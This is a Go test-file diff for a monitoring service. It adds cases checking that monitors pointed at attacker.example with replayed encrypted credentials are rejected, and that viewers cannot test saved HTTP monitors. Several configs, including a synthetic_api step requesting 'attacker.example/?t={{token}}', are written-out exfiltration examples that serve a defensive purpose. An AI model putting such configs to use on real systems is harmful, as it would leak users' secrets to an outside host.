@@ -80,6 +80,11 @@ func TestTestMonitorRejectsCiphertextReplayWithoutSavedID(t *testing.T) {
 		{"prometheus", map[string]any{"url": "https://attacker.example", "query": "up", "operator": "eq", "threshold": 1, "auth_type": "bearer", "bearer_token": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}},
 		{"redis", map[string]any{"host": "attacker.example", "password": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}},
 		{"websocket", map[string]any{"url": "wss://attacker.example", "headers": map[string]string{"Authorization": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}}},
+		{"http", map[string]any{"url": "https://attacker.example", "method": "GET", "secret_headers": map[string]string{"Authorization": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}}},
+		{"http", map[string]any{"url": "https://attacker.example", "method": "GET", "basic_auth_username": "u", "basic_auth_password": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}},
+		{"grpc", map[string]any{"host": "attacker.example", "secret_metadata": map[string]string{"authorization": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}}},
+		{"synthetic_browser", map[string]any{"start_url": "https://attacker.example", "secret_variables": map[string]string{"password": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}, "steps": []map[string]any{{"id": "a", "action": "goto", "url": "https://attacker.example"}}}},
+		{"synthetic_api", map[string]any{"secret_variables": map[string]string{"token": `{"alg":"aes-256-gcm","ct":"replayed-ciphertext"}`}, "steps": []map[string]any{{"id": "a", "request": map[string]any{"method": "GET", "url": "https://attacker.example/?t={{token}}"}}}}},
 	} {
 		t.Run(tc.monitorType, func(t *testing.T) {
 			h := NewHandlers(NewMockMonitorService(), nil, nil, logger.New("test", "error"), t.TempDir())
@@ -156,5 +161,24 @@ func TestMonitorResponsesProtectPushTokens(t *testing.T) {
 				t.Fatal("redaction mutated source model")
 			}
 		})
+	}
+}
+
+// An http monitor carries request credentials now (secret_headers, basic
+// auth), so testing a saved one by monitor_id needs write access like any
+// other secret-bearing type, even when the saved monitor holds no secret.
+func TestSavedHTTPTestRequiresWrite(t *testing.T) {
+	h := NewHandlers(NewMockMonitorService(), nil, nil, logger.New("test", "error"), t.TempDir())
+	queue := &testCheckRequester{}
+	h.jobRequester = queue
+	ctx := ctxpkg.WithRole(ctxpkg.WithTenantID(context.Background(), uuid.NewString()), "viewer")
+	body, _ := json.Marshal(map[string]any{
+		"type": "http", "monitor_id": uuid.NewString(),
+		"config": map[string]any{"url": "https://attacker.example", "method": "GET", "secret_headers": map[string]string{"Authorization": "***"}},
+	})
+	w := httptest.NewRecorder()
+	h.TestMonitorConfig(w, httptest.NewRequest("POST", "/api/v1/monitors/test", strings.NewReader(string(body))).WithContext(ctx))
+	if w.Code != http.StatusForbidden || queue.calls != 0 {
+		t.Fatalf("status %d, worker calls %d; want 403 before any dispatch", w.Code, queue.calls)
 	}
 }
